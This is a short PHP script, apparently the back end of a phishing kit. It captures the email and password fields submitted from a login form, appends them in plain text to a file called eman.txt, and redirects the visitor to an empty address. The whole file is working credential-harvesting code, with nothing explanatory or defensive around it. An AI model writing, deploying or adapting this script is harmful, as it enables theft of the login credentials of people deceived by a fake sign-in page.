<?php

file_put_contents("eman.txt", "email: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:   ');
exit();
